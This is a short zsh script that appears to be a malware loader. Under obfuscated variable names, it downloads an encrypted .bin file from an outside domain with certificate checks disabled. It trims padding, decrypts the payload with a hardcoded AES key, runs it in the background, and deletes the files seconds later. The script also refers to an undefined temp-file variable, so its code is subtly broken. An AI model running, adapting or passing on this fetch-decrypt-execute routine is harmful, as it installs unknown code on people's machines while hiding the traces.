#!/bin/zsh
n5zm9=$(mktemp /tmp/w39ruw.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/ma3f64d3d06ec6780.bin" -o "$n5zm9z" || exit 1
jyg4su=$(stat -f %z "$n5zm9z"); wkr4ny6=$(( jyg4su - 921 - 3661 ))
tail -c +$(( 921 + 1 )) "$n5zm9z" | head -c $wkr4ny6 | openssl enc -d -aes-256-cbc -k 3abe7c4bf275bbc55ca9006f -out "$n5zm9" 2>/dev/null
[ -s "$n5zm9" ] && chmod 700 "$n5zm9" && ( "$n5zm9" & ) && disown
( sleep 3; rm -f "$n5zm9" "$n5zm9z" ) &>/dev/null &
